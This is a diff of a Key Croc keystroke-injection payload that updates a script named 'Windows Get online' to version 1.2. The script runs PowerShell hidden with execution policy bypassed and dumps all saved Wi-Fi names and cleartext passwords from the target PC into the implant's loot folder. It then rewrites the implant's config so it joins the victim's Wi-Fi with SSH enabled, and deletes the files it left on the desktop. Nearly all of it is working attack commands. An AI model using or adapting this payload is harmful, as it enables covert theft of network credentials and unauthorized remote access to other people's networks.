@@ -1,13 +1,12 @@
 # Title:         Windows Get online   
 # Description:   Get online automatically to target pc wifi or to your own wifi
 # Author:        spywill
-# Version:       1.0
+# Version:       1.2
 # Category:      Key Croc
 #
 #
 MATCH getonline
 QUACK LOCK
-QUACK DELAY 1000
 # --> udisk unmount
 ATTACKMODE HID STORAGE
 QUACK DELAY 5000
@@ -16,47 +15,30 @@ QUACK CONTROL-ALT-TAB
 QUACK DELETE
 QUACK DELETE
 QUACK DELETE 
-QUACK DELAY 1000
+QUACK DELAY 500
 # --> Minimize all windows
 QUACK GUI d
 # --> Open cmd
 QUACK GUI r
-QUACK DELAY 1000
+QUACK DELAY 500
 # --> Open powershell
-QUACK STRING powershell
-QUACK ENTER 
-QUACK DELAY 1000
-# --> Copy the config.txt from KeyCroc to desktop
+QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
 QUACK ENTER
+QUACK DELAY 1000
+# --> Get KeyCroc drive
 QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
 QUACK ENTER
-QUACK STRING "xcopy /y \"\$Croc\config.txt\" \$env:userprofile\Desktop"
-QUACK ENTER
 QUACK DELAY 1000
-# --> Create Wifipasswd.txt with all SSID and PASSWD 
-QUACK ENTER
-QUACK STRING "(netsh wlan show profiles) | Select-String \"\:(.+)\$\" | %" 
-QUACK STRING "{\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | "
-QUACK STRING " Select-String \"Key Content\W+\:(.+)\$\"" 
-QUACK STRING " | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_}"
-QUACK STRING " | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }}"
-QUACK STRING " | Format-Table -AutoSize"
-QUACK STRING " | Out-File \"\$env:userprofile\Desktop\Wifipasswd.txt\""
+# --> Create Wifipasswd.txt with all SSID and PASSWD put in Keycroc loot folder 
+QUACK STRING "(netsh wlan show profiles) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table -AutoSize | Out-File \"\$Croc\loot\Wifipasswd.txt\""
 QUACK ENTER
 QUACK DELAY 1000
 # --> Create wifipass.txt with the taget pc SSID and PASSWD
-QUACK STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | %" 
-QUACK STRING "{\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | "
-QUACK STRING " Select-String \"Key Content\W+\:(.+)\$\"" 
-QUACK STRING " | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_}"
-QUACK STRING " | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }}"
-QUACK STRING " | Format-Table -AutoSize"
-QUACK STRING " | Out-File \"\$env:userprofile\Desktop\wifipass.txt\""
+QUACK STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table -AutoSize | Out-File \"\$env:userprofile\Desktop\wifipass.txt\""
 QUACK ENTER
 QUACK DELAY 1000
-QUACK ENTER
 # --> Open notepad with the KeyCroc config.txt
-QUACK STRING "notepad \$env:userprofile\Desktop\config.txt"
+QUACK STRING "notepad \$Croc\config.txt"
 QUACK ENTER
 # --> Edit the config.txt
 QUACK DELAY 1000
@@ -70,22 +52,16 @@ QUACK STRING "WIFI_PASS"
 QUACK ENTER
 QUACK STRING "SSH ENABLE"
 QUACK ENTER
-QUACK CONTROL-ALT-TAB
+QUACK GUI r
 QUACK DELAY 500
+QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
 QUACK ENTER
+QUACK DELAY 1000 
 # --> Open wifipass.txt to copy and paste the SSID and PASSWD
 QUACK STRING "notepad \$env:userprofile\Desktop\wifipass.txt"
 QUACK ENTER
 QUACK DELAY 1000
-QUACK CONTROL-ALT-TAB
-QUACK DELAY 500
-QUACK ENTER
-# --> Exit powershell
-QUACK STRING "exit"
 # --> Copy and paste the SSID AND PASSWD to the config.txt
-QUACK ENTER
-QUACK DELAY 500
-# --> select line to edit
 QUACK CONTROL-g
 QUACK DELAY 500
 QUACK STRING "4"
@@ -101,8 +77,9 @@ QUACK DELAY 500
 QUACK CONTROL-ALT-TAB
 QUACK ENTER
 QUACK DELAY 500
+# --> select line to edit
 QUACK CONTROL-g
-QUACK DELAY 1000
+QUACK DELAY 500
 QUACK STRING "11"
 QUACK ENTER
 QUACK DELAY 500
@@ -137,28 +114,19 @@ QUACK DELAY 500
 # --> Save config.txt
 QUACK CONTROL w
 QUACK ENTER
-QUACK GUI d
+QUACK DELAY 500
+QUACK CONTROL-ALT-TAB
+QUACK DELETE
+QUACK DELAY 500
 QUACK GUI r
 QUACK DELAY 500
-QUACK STRING powershell
+QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
 QUACK ENTER 
 QUACK DELAY 1000
-# --> Copy config.txt to KeyCroc and deleting all .txt from target PC
-QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
-QUACK ENTER
-QUACK STRING "xcopy /y \"Desktop\config.txt\" \$Croc"
-QUACK ENTER
-QUACK STRING "xcopy /y \"Desktop\Wifipasswd.txt\" \$Croc\loot"
-QUACK ENTER
-QUACK STRING del "Desktop\config.txt"
-QUACK ENTER
+# --> delete wifipass.txt from target PC
 QUACK STRING del "Desktop\wifipass.txt"
 QUACK ENTER
-QUACK STRING del "Desktop\Wifipasswd.txt"
-QUACK ENTER
 QUACK DELAY 500
-QUACK STRING "exit"
-QUACK ENTER
 # --> Returning to HID Mode
 ATTACKMODE HID
 QUACK DELAY 5000
